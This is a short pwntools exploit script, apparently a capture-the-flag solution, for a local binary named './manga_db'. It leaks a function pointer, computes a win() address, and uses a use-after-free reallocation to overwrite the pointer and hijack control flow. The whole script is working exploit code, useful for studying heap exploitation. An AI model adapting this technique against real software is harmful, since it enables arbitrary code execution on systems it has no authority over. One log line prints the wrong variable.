

from pwn import *
context(arch = 'x86_64', os = 'linux')
local_file = "./manga_db"
r = process(local_file)
def create(title, entry_type):
    global r
    r.sendline(b"1")
    r.recvuntil(b"enter the title: ")
    r.sendline(title)
    r.recvuntil(b"> ")
    r.sendline(entry_type)

def delete(title):
    global r
    r.sendline(b"4")
    r.recvuntil(b"enter the title you want to delete: ")
    r.sendline(title)

def edit(title, new_title):
    global r
    r.sendline(b"2")
    r.recvuntil(b"enter the title you want to edit: ")
    r.sendline(title)
    r.recvuntil(b"enter the new title: ")
    r.sendline(new_title)

r.recvuntil(b"> ")
# create manga/anime structures
create(b"Z", b"1")
create(b"X", b"1")
create(b"L", b"1")
# edit to leak pointer/allow for overwrite later
edit(b"X", b"AAAA")
r.recvuntil(b"> ")
r.sendline(b"3")

x = r.recvuntil(b"> ")
# hackjob to get the pointer
p1 = x.find(b"Anime: L\nAnime: ")
p2 = x.find(b"Anime: Z")
ptr = u64(x[p1+16:p2].ljust(8, b'\0'))
log.info(f"print_anime pointer: {hex(ptr)}")
ptr_win = ptr - 0x1238 + 0x11E9
log.info(f"win pointer: {hex(ptr)}")
# delete so we can overwrite the pointer
delete(b"X")
# overwrite the pointer
r.recvuntil(b"> ")
create(p64(ptr_win), b"1")
# trigger the print to call win()
r.sendline(b"3")
r.interactive()
